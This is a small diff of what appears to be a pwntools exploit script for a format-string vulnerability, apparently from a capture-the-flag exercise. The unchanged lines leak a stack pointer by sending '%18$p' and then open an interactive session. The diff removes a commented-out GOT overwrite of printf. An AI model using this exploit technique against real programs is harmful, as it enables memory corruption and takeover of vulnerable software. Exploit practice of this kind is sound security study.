@@ -62,10 +62,6 @@ def main():
     log.success("Format string offset is: %d", format_string.offset)
     format_string.offset = format_string.offset
 
-
-    #format_string.write(got_addr_printf, 0x1337babe)  # 0xe1
-    #format_string.execute_writes()
-
     offset_stack = 0x7fffffffdd60 - 0x7fffffffdc48
     r.sendline(b"%18$p")
     r.recvuntil(b"password is: ")
@@ -97,8 +93,6 @@ def main():
 
     r.interactive()
     sleep(3)
-
-    # Send it
 
 
 if __name__ == "__main__":
